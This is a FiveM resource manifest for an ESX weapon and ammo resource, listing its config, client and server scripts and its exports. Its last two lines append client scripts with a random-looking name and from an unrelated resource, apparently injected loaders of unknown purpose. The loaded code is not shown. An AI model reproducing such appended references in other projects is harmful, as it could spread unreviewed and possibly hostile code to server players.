fx_version 'bodacious'
game 'gta5'

client_scripts {
  '@es_extended/locale.lua',
  "config.lua",
  "client.lua"
}

server_scripts {
  '@es_extended/locale.lua',
  "config.lua",
  "server.lua"
}

exports { 'IsWeapon', 'IsAmmo', 'GetAmmoCount' }
server_exports { 'IsWeapon' }

client_script "api-ac_wZeWcWKxHyll.lua"

client_script '@pozdoodtajczyka/client/main.lua'